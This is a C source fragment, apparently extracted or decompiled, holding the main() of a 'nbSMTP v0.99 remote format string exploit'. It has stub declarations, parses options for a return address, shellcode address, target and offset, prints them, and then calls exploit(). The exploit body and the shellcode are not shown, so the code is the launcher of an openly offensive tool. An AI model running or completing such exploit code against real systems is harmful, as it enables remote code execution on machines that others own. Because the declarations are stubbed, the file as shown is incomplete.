
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* os; int retaddr; int shaddr; int num; } ;


 char EOF ;
 int atoi (int ) ;
 int exploit (int,int) ;
 int fflush (int ) ;
 char getopt (int,char**,char*) ;
 int optarg ;
 int printf (char*,...) ;
 int printlist () ;
 int stdout ;
 int strtoul (int ,int *,int ) ;
 TYPE_1__* targets ;
 int use (char*) ;

int main(int argc, char *argv[])
{
 char opt, *system=((void*)0);
 int shaddr=0, retaddr=0, targetnum=0, offset=0, i;

 printf("\n nbSMTP v0.99 remote format string exploit\n");
 printf(" by CoKi <coki@nosystem.com.ar>\n\n");

 while((opt = getopt(argc,argv,"r:s:t:lo:")) != EOF) {
  switch (opt) {
   case 'r':
    retaddr = strtoul(optarg,((void*)0),0);
    system = "unknown";
    break;
   case 's':
    shaddr = strtoul(optarg,((void*)0),0);
    break;
   case 't':
    targetnum = atoi(optarg)-1;
    if(targets[targetnum].num) {
     system = targets[targetnum].os;
     retaddr = targets[targetnum].retaddr;
     shaddr = targets[targetnum].shaddr;
    }
    else use(argv[0]);
    break;
   case 'l':
    printlist();
    break;
   case 'o':
     offset = atoi(optarg);
           shaddr += offset;
           break;
   default:
    use(argv[0]);
    break;
  }
 }

 if(retaddr == 0) use(argv[0]);
 if(shaddr == 0) use(argv[0]);
 if(system == ((void*)0)) {
  system = "unknown";
 }

 printf(" [*] system\t\t\t: %s\n", system);
 printf(" [*] return address\t\t: %010p\n", retaddr);

 printf(" [*] shellcode address\t\t: %010p", shaddr);
 fflush(stdout);

 if(offset) printf(" (offset %d)\n", offset);
 else printf("\n");

 exploit(retaddr, shaddr);
}
